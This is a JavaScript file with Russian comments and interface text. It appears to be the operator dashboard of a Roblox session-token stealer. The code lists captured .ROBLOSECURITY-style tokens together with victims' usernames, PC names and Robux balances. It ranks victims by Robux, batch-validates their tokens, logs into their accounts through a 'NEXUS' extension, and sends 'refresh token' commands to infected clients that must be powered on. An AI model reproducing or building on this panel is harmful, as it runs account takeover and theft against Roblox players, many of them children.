if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('tokens');
bindLogout();

let allTokens = [];
let sortMode = 'date'; // 'date' | 'robux' | 'login'

// ── Загрузка токенов с сервера ────────────────────────────────────────────────
async function loadTokens() {
  const container = document.getElementById('tokensContainer');
  try {
    const resp = await apiFetch('/tokens-data');
    allTokens = await resp.json();
    if (!Array.isArray(allTokens)) allTokens = [];
    updateStats();
    renderTokens();
  } catch (err) {
    if (err.message !== 'auth') {
      container.innerHTML = '<div class="empty">Не удалось загрузить токены</div>';
    }
  }
}

// ── Статистика ────────────────────────────────────────────────────────────────
function updateStats() {
  document.getElementById('sTotal').textContent = allTokens.length;
  const valid = allTokens.filter(t => t.valid).length;
  document.getElementById('sValid').textContent = valid;

  const totalRobux = allTokens.reduce((sum, t) => {
    return sum + (t.valid && t.robux ? t.robux : 0);
  }, 0);
  document.getElementById('sTotalRobux').textContent = totalRobux.toLocaleString() + ' R$';
}

// ── Рендер токенов ────────────────────────────────────────────────────────────
function renderTokens() {
  const container = document.getElementById('tokensContainer');
  if (!allTokens.length) {
    container.innerHTML = '<div class="empty">База токенов пуста</div>';
    return;
  }

  let list = [...allTokens];

  if (sortMode === 'robux') {
    list.sort((a, b) => {
      const ar = (a.valid && a.robux) ? a.robux : -1;
      const br = (b.valid && b.robux) ? b.robux : -1;
      return br - ar;
    });
  } else if (sortMode === 'login') {
    list.sort((a, b) => {
      const loginA = parseInt(a.lastLogin || localStorage.getItem('login_' + (a.file || '')) || '0');
      const loginB = parseInt(b.lastLogin || localStorage.getItem('login_' + (b.file || '')) || '0');
      if (loginA !== loginB) return loginA - loginB;
      return new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0);
    });
  } else {
    list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
  }

  let html = '<div class="tokens-grid">';

  list.forEach((t, i) => {
    const valid = t.valid;
    const badgeClass = valid ? 'badge-valid' : 'badge-invalid';
    const statusText = valid ? 'VALID' : 'INVALID';
    const fileId = t.file || '';

    html += '<div class="token-card">';
    html += '<div class="token-card-status"><span class="badge ' + badgeClass + '">' + statusText + '</span></div>';
    
    if (valid && t.robux !== undefined && t.robux > 0) {
      html += '<div class="token-card-robux">' + t.robux.toLocaleString() + ' R$</div>';
    } else {
      html += '<div class="token-card-robux" style="background: rgba(255,255,255,0.04); color: var(--text-muted); border-color: transparent;">0 R$</div>';
    }
    
    let avatarHtml = '<div class="token-card-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>';
    if (t.userId) {
      avatarHtml = '<div class="token-card-avatar"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" alt="Avatar" onerror="this.outerHTML=\'<div class=\\\'token-card-avatar\\\'>O</div>\'"></div>';
    }
    html += avatarHtml;
    html += '<div class="token-card-name">' + escapeHtml(t.username || t.user || '—') + '</div>';
    html += '<div class="token-card-computer">ПК: ' + escapeHtml(t.computer || '—') + '</div>';
    
    html += '<div class="token-card-actions">';
    
    let loginBtnText = 'Войти';
    let loginClass = 'btn-login';
    const lastLogin = t.lastLogin || localStorage.getItem('login_' + fileId);
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      loginBtnText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      loginClass = 'btn-login logged-in';
    }
    
    if (t.security) {
      html += '<div style="display:flex; gap:6px;">';
      html += '<button class="' + loginClass + '" style="flex:1;" data-file="' + escapeHtml(fileId) + '" onclick="loginByFile(\'' + escapeHtml(fileId) + '\', this)">' + loginBtnText + '</button>';
      html += '<button class="btn-secondary" title="Запросить новый токен" style="width:auto; padding:0 10px; color: var(--accent);" onclick="requestToken(\'' + escapeHtml(fileId) + '\')">Запрос</button>';
      html += '<button class="btn-secondary" title="Удалить токен" style="width:auto; padding:0 10px; color: var(--danger);" onclick="deleteToken(\'' + escapeHtml(fileId) + '\')">Удалить</button>';
      html += '</div>';
    }
    
    html += '</div></div>';
  });

  html += '</div>';
  container.innerHTML = html;
}

// ── Вход в Roblox по токену через расширение ──────────────────────────────────
function loginByFile(fileId, btn) {
  const tokenItem = allTokens.find(t => t.file === fileId);
  if (!tokenItem || !tokenItem.security) {
    toast('Токен не найден', 'err');
    return;
  }
  loginToRoblox(tokenItem.security, btn, fileId);
}

function loginToRoblox(token, btn, fileId) {
  if (!token) return;
  btn.textContent = 'Вход...';
  btn.disabled = true;

  let answered = false;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      answered = true;
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          const nowTs = Date.now();
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId, timestamp: nowTs })
          }).catch(()=>{});
          localStorage.setItem('login_' + fileId, String(nowTs));
          const tokenData = allTokens.find(t => t.file === fileId);
          if (tokenData) {
            tokenData.lastLogin = nowTs;
            if (tokenData.userId) localStorage.setItem('login_user_' + tokenData.userId, String(nowTs));
            if (tokenData.username) localStorage.setItem('login_user_' + tokenData.username.toLowerCase(), String(nowTs));
          }
        }
        const d = new Date();
        btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
        btn.className = 'btn-login logged-in';
        btn.disabled = false;
        toast('Вход выполнен, открываем Roblox...');
      } else {
        restoreBtnText();
        toast('Установите расширение NEXUS для входа', 'err');
      }
    }
  }

  function restoreBtnText() {
    const tokenData = allTokens.find(t => t.file === fileId);
    const lastLogin = (tokenData && tokenData.lastLogin) ? tokenData.lastLogin : (fileId ? localStorage.getItem('login_' + fileId) : null);
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      btn.className = 'btn-login logged-in';
    } else {
      btn.textContent = 'Войти';
      btn.className = 'btn-login';
    }
    btn.disabled = false;
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    if (!answered) {
      window.removeEventListener('message', handler);
      restoreBtnText();
      toast('Установите расширение NEXUS для входа', 'err');
    }
  }, 1200);
}

// ── Проверить все токены ──────────────────────────────────────────────────────
document.getElementById('btnCheckAll')?.addEventListener('click', async function() {
  const btn = this;
  if (!allTokens || allTokens.length === 0) {
    toast('Список токенов пуст', 'err');
    return;
  }

  btn.disabled = true;
  const originalText = btn.textContent;
  const total = allTokens.length;
  const CHUNK_SIZE = 15;

  try {
    for (let i = 0; i < total; i += CHUNK_SIZE) {
      const chunk = allTokens.slice(i, i + CHUNK_SIZE);
      btn.textContent = `[${Math.min(i + CHUNK_SIZE, total)}/${total}] Проверка...`;

      try {
        const r = await apiFetch('/api/tokens-check-batch', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ tokens: chunk.map(t => ({ file: t.file, security: t.security })) })
        });

        if (r.ok) {
          const data = await r.json();
          if (data && Array.isArray(data.results)) {
            data.results.forEach(res => {
              const item = allTokens.find(t => t.file === res.file);
              if (item) {
                Object.assign(item, res);
              }
            });
            updateStats();
            renderTokens();
          }
        }
      } catch (errChunk) {
        console.warn('Chunk check error:', errChunk);
      }
    }

    const validCount = allTokens.filter(t => t.valid).length;
    toast(`Проверено: ${validCount}/${total} рабочих`);
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки токенов', 'err');
  } finally {
    btn.disabled = false;
    btn.textContent = originalText;
  }
});

// ── Кнопка «Удалить невалид» ───────────────────────────────────────────────────
document.getElementById('btnDeleteInvalid')?.addEventListener('click', async function() {
  const invalidTokens = allTokens.filter(t => t.valid === false);
  if (invalidTokens.length === 0) {
    toast('Невалидных токенов нет');
    return;
  }
  if (!confirm(`Удалить ${invalidTokens.length} невалидных токенов?`)) return;

  const filenames = invalidTokens.map(t => t.file).filter(Boolean);
  try {
    const r = await apiFetch('/api/tokens-delete-invalid', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filenames })
    });
    allTokens = allTokens.filter(t => t.valid !== false);
    updateStats();
    renderTokens();
    toast(`Удалено ${filenames.length} невалидных токенов`);
  } catch (e) {
    toast('Ошибка удаления', 'err');
  }
});

// ── Запросить все токены ─────────────────────────────────────────────────────────────
document.getElementById('btnRequestAll')?.addEventListener('click', async function() {
  const btn = this;
  if (!confirm('Отправить команду всем клиентам на принудительное обновление токенов? (Компьютеры должны быть включены)')) return;
  const originalHtml = btn.innerHTML;
  btn.disabled = true;
  btn.textContent = 'Запрос...';
  try {
    await apiFetch('/request-token-all', { method: 'POST' });
    toast('Запрос на обновление отправлен всем клиентам');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка отправки запроса', 'err');
  }
  btn.disabled = false;
  btn.innerHTML = originalHtml;
});

// ── Запросить один токен ─────────────────────────────────────────────────────────────
async function requestToken(filename) {
  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
  try {
    const r = await apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    if (r.ok) {
      toast('Запрос на обновление токена отправлен');
    } else {
      toast('Ошибка при отправке запроса', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Удалить один токен ────────────────────────────────────────────────────────
async function deleteToken(fileId) {
  if (!confirm('Вы уверены, что хотите удалить этот токен?')) return;
  try {
    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
    if (r.ok) {
      allTokens = allTokens.filter(t => t.file !== fileId);
      updateStats();
      renderTokens();
      toast('Токен удален');
    } else {
      toast('Ошибка удаления', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Сортировка ────────────────────────────────────────────────────────────────
document.getElementById('btnSortDate')?.addEventListener('click', function() {
  sortMode = 'date';
  this.classList.add('active');
  document.getElementById('btnSortRobux')?.classList.remove('active');
  document.getElementById('btnSortLogin')?.classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortRobux')?.addEventListener('click', function() {
  sortMode = 'robux';
  this.classList.add('active');
  document.getElementById('btnSortDate')?.classList.remove('active');
  document.getElementById('btnSortLogin')?.classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortLogin')?.addEventListener('click', function() {
  sortMode = 'login';
  this.classList.add('active');
  document.getElementById('btnSortDate')?.classList.remove('active');
  document.getElementById('btnSortRobux')?.classList.remove('active');
  renderTokens();
});

loadTokens();
